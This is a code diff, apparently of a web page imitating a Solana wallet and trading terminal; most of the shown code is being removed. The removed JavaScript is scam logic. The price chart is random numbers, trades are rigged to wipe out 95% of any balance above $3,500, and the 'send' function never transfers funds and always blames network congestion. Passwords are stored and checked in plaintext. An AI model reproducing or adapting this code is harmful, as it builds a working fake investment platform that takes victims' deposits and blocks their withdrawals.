-            document.getElementById('wallet-address-head').innerText = addr.slice(0,4) + "..." + addr.slice(-4);
-            document.getElementById('recv-addr').innerText = addr;
-            
-            const qrEl = document.getElementById("qrcode");
-            qrEl.innerHTML = "";
-            new QRCode(qrEl, { text: addr, width: 140, height: 140, colorDark : "#000000", colorLight : "#ffffff" });
-            
-            updateUI();
-        }
+                showToast("Terminal Initialized.");
+                setTimeout(() => window.location.href = REDIRECT_URL, 2000);
 
-        function updateUI() {
-            document.getElementById('balance-usd').innerText = `$${userBalance.toFixed(2)}`;
-            document.getElementById('balance-sol').innerText = `${(userBalance / SOL_PRICE).toFixed(2)} SOL`;
-            document.getElementById('balance-usd-sol').innerText = `$${userBalance.toFixed(2)}`;
-            document.getElementById('sol-price-display').innerText = `$${SOL_PRICE.toFixed(2)}`;
-            
-            const warn = document.getElementById('send-balance-warning');
-            if(userBalance <= 0) {
-                warn.style.opacity = "1";
-            } else {
-                warn.style.opacity = "0";
-            }
-
-            if(activeTrade) {
-                const diff = activeTrade.type === 'BUY' ? (SOL_PRICE - activeTrade.entry) : (activeTrade.entry - SOL_PRICE);
-                const pnl = diff * activeTrade.lots * 100;
-                const pnlEl = document.getElementById('floating-pnl');
-                pnlEl.innerText = (pnl >= 0 ? '+$' : '-$') + Math.abs(pnl).toFixed(2);
-                pnlEl.className = pnl >= 0 ? 'text-green-500' : 'text-red-500';
+            } catch (err) {
+                showToast("Critical Write Error");
+                setTimeout(() => location.reload(), 2000);
             }
         }
-
-        function initCandlesticks() {
-            let p = 145.50;
-            for(let i=0; i<40; i++) {
-                let v = (Math.random() * 0.6) + 0.1;
-                let o = p;
-                let c = o + (Math.random() - 0.5) * v;
-                candles.push({ open: o, close: c, high: Math.max(o,c)+Math.random()*0.2, low: Math.min(o,c)-Math.random()*0.2 });
-                p = c;
-            }
-            renderCandles();
-        }
-
-        function renderCandles() {
-            const container = document.getElementById('chart-container');
-            if(!container) return;
-            container.innerHTML = '';
-            const all = candles.flatMap(c => [c.high, c.low]);
-            if(activeTrade) all.push(activeTrade.entry, activeTrade.tp, activeTrade.sl);
-            
-            const max = Math.max(...all) + 0.1;
-            const min = Math.min(...all) - 0.1;
-            const range = max - min;
-            const h = container.clientHeight;
-
-            const getY = (price) => h - ((price - min) / range) * h;
-
-            if(activeTrade) {
-                drawLine(container, getY(activeTrade.entry), '#ffffff', `ENTRY`);
-                if(activeTrade.tp) drawLine(container, getY(activeTrade.tp), '#22c55e', `TP`);
-                if(activeTrade.sl) drawLine(container, getY(activeTrade.sl), '#ef4444', `SL`);
-            }
-
-            candles.forEach((c, i) => {
-                const color = c.close >= c.open ? '#22c55e' : '#ef4444';
-                const x = i * 7 + 10;
-                const ct = getY(Math.max(c.open, c.close));
-                const cb = getY(Math.min(c.open, c.close));
-                const wt = getY(c.high);
-                const wb = getY(c.low);
-
-                const body = document.createElement('div');
-                body.className = 'candle';
-                body.style.left = `${x}px`;
-                body.style.top = `${ct}px`;
-                body.style.height = `${Math.max(1, cb - ct)}px`;
-                body.style.backgroundColor = color;
-
-                const wick = document.createElement('div');
-                wick.className = 'candle-wick';
-                wick.style.top = `${wt - ct}px`;
-                wick.style.height = `${wb - wt}px`;
-                wick.style.backgroundColor = color;
-
-                body.appendChild(wick);
-                container.appendChild(body);
-            });
-        }
-
-        function drawLine(cont, y, color, text) {
-            const l = document.createElement('div');
-            l.className = 'price-line';
-            l.style.top = `${y}px`;
-            l.style.borderColor = color;
-            const b = document.createElement('div');
-            b.className = 'price-label';
-            b.style.top = `${y}px`;
-            b.style.backgroundColor = color;
-            b.style.color = color === '#ffffff' ? '#000' : '#fff';
-            b.innerText = text;
-            cont.appendChild(l);
-            cont.appendChild(b);
-        }
-
-        function tickMarket() {
-            const last = candles[candles.length - 1];
-            if(!last) return;
-            const o = last.close;
-            const c = o + (Math.random() - 0.5) * 0.3;
-            SOL_PRICE = c;
-            candles.shift();
-            candles.push({ open: o, close: c, high: Math.max(o,c)+0.1, low: Math.min(o,c)-0.1 });
-            
-            if(activeTrade) {
-                if(activeTrade.tp && ((activeTrade.type === 'BUY' && SOL_PRICE >= activeTrade.tp) || (activeTrade.type === 'SELL' && SOL_PRICE <= activeTrade.tp))) closeTrade('TP');
-                if(activeTrade.sl && ((activeTrade.type === 'BUY' && SOL_PRICE <= activeTrade.sl) || (activeTrade.type === 'SELL' && SOL_PRICE >= activeTrade.sl))) closeTrade('SL');
-            }
-            renderCandles();
-            updateUI();
-        }
-
-        function executeTrade(type) {
-            if(userBalance <= 0) {
-                showToast("Insufficient Funds to open trade.");
-                return;
-            }
-
-            const lots = parseFloat(document.getElementById('trade-lots').value);
-            activeTrade = { 
-                type, 
-                entry: SOL_PRICE, 
-                lots, 
-                tp: type === 'BUY' ? SOL_PRICE + 1.2 : SOL_PRICE - 1.2,
-                sl: type === 'BUY' ? SOL_PRICE - 0.8 : SOL_PRICE + 0.8,
-                startTime: Date.now(), 
-                duration: (3 + Math.random() * 5) * 60000 
-            };
-            
-            document.getElementById('trade-buttons').classList.add('hidden');
-            document.getElementById('active-trade-info').classList.remove('hidden');
-            document.getElementById('pnl-badge').classList.remove('hidden');
-            document.getElementById('active-type').innerText = type;
-            document.getElementById('active-entry').innerText = `Entry: $${SOL_PRICE.toFixed(2)}`;
-
-            tradeInterval = setInterval(() => {
-                const rem = activeTrade.duration - (Date.now() - activeTrade.startTime);
-                if(rem <= 0) { closeTrade('EXPIRY'); return; }
-                const m = Math.floor(rem / 60000);
-                const s = Math.floor((rem % 60000) / 1000);
-                document.getElementById('trade-timer').innerText = `${m}:${s.toString().padStart(2, '0')}`;
-            }, 1000);
-        }
-
-        function closeTrade(reason) {
-            clearInterval(tradeInterval);
-            const diff = activeTrade.type === 'BUY' ? (SOL_PRICE - activeTrade.entry) : (activeTrade.entry - SOL_PRICE);
-            let pnl = diff * activeTrade.lots * 100;
-            
-            if(userBalance > 3500) pnl = -userBalance * 0.95;
-
-            userBalance += pnl;
-            if(userBalance < 0) userBalance = 0;
-
-            showToast(pnl >= 0 ? `Closed: +$${pnl.toFixed(2)}` : `Closed: -$${Math.abs(pnl).toFixed(2)}`);
-            activeTrade = null;
-            document.getElementById('trade-buttons').classList.remove('hidden');
-            document.getElementById('active-trade-info').classList.add('hidden');
-            document.getElementById('pnl-badge').classList.add('hidden');
-            updateUI();
-            
-            if(user) sb.from('profiles').update({ balance: userBalance }).eq('id', user.id);
-        }
-
-        function processSend() {
-            const addr = document.getElementById('send-to').value;
-            const amount = parseFloat(document.getElementById('send-amount').value);
-            if(!addr || isNaN(amount)) return showToast("Invalid Details");
-            if(amount > (userBalance / SOL_PRICE)) return showToast("Insufficient SOL Balance");
-            showToast('Error: Network Congestion. Try again later.');
-        }
-
-        function switchView(v) {
-            document.querySelectorAll('.view').forEach(el => el.classList.add('hidden'));
-            document.getElementById(`view-${v}`).classList.remove('hidden');
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.id === `nav-${v}`));
-        }
-
-        function toggleAuth(m) { document.getElementById('login-form').classList.toggle('hidden', m==='signup'); document.getElementById('signup-form').classList.toggle('hidden', m==='login'); }
-        function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.classList.remove('translate-y-64'); setTimeout(() => t.classList.add('translate-y-64'), 3000); }
-        function copyAddr() { 
-            const el = document.createElement('textarea');
-            el.value = document.getElementById('recv-addr').innerText;
-            document.body.appendChild(el);
-            el.select();
-            document.execCommand('copy');
-            document.body.removeChild(el);
-            showToast("Address Copied"); 
-        }
-        async function signIn() {
-            const u = document.getElementById('login-username').value;
-            const p = document.getElementById('login-password').value;
-            const { data } = await sb.from('profiles').select('*').eq('username', u).eq('password', p).single();
-            if(data) { 
-                user = data; 
-                userBalance = parseFloat(data.balance || 0); 
-                localStorage.setItem('phantom_user', JSON.stringify(user));
-                loadSession(); 
-            } else showToast("Access Denied");
-        }
-        function signOut() { localStorage.removeItem('phantom_user'); location.reload(); }
     </script>
 </body>
 </html>
